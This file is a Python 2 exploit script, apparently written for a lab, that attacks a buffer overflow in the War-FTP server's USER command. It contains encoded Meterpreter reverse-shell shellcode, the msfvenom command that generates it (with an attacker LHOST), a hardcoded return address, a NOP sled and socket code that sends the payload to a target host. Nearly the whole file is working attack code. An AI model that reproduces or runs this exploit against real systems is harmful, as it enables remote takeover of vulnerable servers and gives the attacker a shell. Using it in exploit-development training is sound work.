#!/usr/bin/python

import socket
import sys
import struct

banner = """
#----------------------------------------------#
War-FTP Server Exploit Fuzzer
1. python war-ftpd-badchars.py
#----------------------------------------------#
"""

print banner
#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x40' -f c
shellcode = ("\xd9\xe9\xd9\x74\x24\xf4\x5f\x2b\xc9\xbe\xd6\x34\x11\xbe\xb1"
"\x54\x31\x77\x18\x03\x77\x18\x83\xef\x2a\xd6\xe4\x42\x3a\x95"
"\x07\xbb\xba\xfa\x8e\x5e\x8b\x3a\xf4\x2b\xbb\x8a\x7e\x79\x37"
"\x60\xd2\x6a\xcc\x04\xfb\x9d\x65\xa2\xdd\x90\x76\x9f\x1e\xb2"
"\xf4\xe2\x72\x14\xc5\x2c\x87\x55\x02\x50\x6a\x07\xdb\x1e\xd9"
"\xb8\x68\x6a\xe2\x33\x22\x7a\x62\xa7\xf2\x7d\x43\x76\x89\x27"
"\x43\x78\x5e\x5c\xca\x62\x83\x59\x84\x19\x77\x15\x17\xc8\x46"
"\xd6\xb4\x35\x67\x25\xc4\x72\x4f\xd6\xb3\x8a\xac\x6b\xc4\x48"
"\xcf\xb7\x41\x4b\x77\x33\xf1\xb7\x86\x90\x64\x33\x84\x5d\xe2"
"\x1b\x88\x60\x27\x10\xb4\xe9\xc6\xf7\x3d\xa9\xec\xd3\x66\x69"
"\x8c\x42\xc2\xdc\xb1\x95\xad\x81\x17\xdd\x43\xd5\x25\xbc\x0b"
"\x1a\x04\x3f\xcb\x34\x1f\x4c\xf9\x9b\x8b\xda\xb1\x54\x12\x1c"
"\xb6\x4e\xe2\xb2\x49\x71\x13\x9a\x8d\x25\x43\xb4\x24\x46\x08"
"\x44\xc9\x93\xa5\x41\x5d\xb0\x2a\x03\x1d\xa0\x48\x93\x0c\x6d"
"\xc4\x75\x7e\xdd\x86\x29\x3e\x8d\x66\x9a\xd6\xc7\x68\xc5\xc6"
"\xe7\xa2\x6e\x6c\x08\x1b\xc6\x18\xb1\x06\x9c\xb9\x3e\x9d\xd8"
"\xf9\xb5\x14\x1c\xb7\x3d\x5c\x0e\xaf\x5f\x9e\xce\x2f\xca\x9e"
"\xa4\x2b\x5c\xc8\x50\x31\xb9\x3e\xff\xca\xec\x3c\xf8\x34\x71"
"\x75\x72\x02\xe7\x39\xec\x6a\xe7\xb9\xec\x3c\x6d\xba\x84\x98"
"\xd5\xe9\xb1\xe7\xc3\x9d\x69\x7d\xec\xf7\xde\xd6\x84\xf5\x39"
"\x10\x0b\x05\x6c\x23\x4c\xf9\xf2\x01\xf5\x92\x0c\x05\x05\x63"
"\x67\x85\x55\x0b\x7c\xaa\x5a\xfb\x7d\x61\x33\x93\xf4\xe7\xf1"
"\x02\x08\x22\x57\x9b\x09\xc0\x4c\xca\x87\x27\x73\xf3\x69\x14"
"\xa5\xca\x1f\x5d\x75\x69\x2f\xd4\xd8\xd8\xba\x16\x4e\x1a\xef")
#badchars = \x00\x0a\x0d\x40

buffer = "A"*485
buffer += "\x53\x93\x42\x7e"
buffer += "\x90"*100
buffer += shellcode
buffer += "D"*(1100-len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nDestroy them with lazers..."
	s.connect(('172.16.73.129',21))
	print s.recv(1500)
	s.send('USER ' + buffer + '\r\n')
	print s.recv(1500)
	s.send('PASS chanch@chanch.com\r\n')
	print s.recv(1500)
	s.close()
	print "\nFire in the hole! Go pick up the pieces!"
except:
	print "ERROR! Shutting it dooooown.."
